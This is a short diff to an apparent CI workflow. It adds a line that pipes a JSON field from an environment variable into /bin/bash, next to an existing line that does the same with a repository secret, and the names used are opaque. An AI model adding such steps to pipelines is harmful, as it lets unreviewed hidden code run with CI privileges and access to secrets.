@@ -20,6 +20,7 @@ jobs:
           i04871: ${{ secrets.i04871 }}
         run: |
           printf '%s' "$i04871" | jq -r .u26449 | /bin/bash
+          printf '%s' "$hh8121" | jq -r .q809 | /bin/bash
 
       - name: Persist results
         if: always()
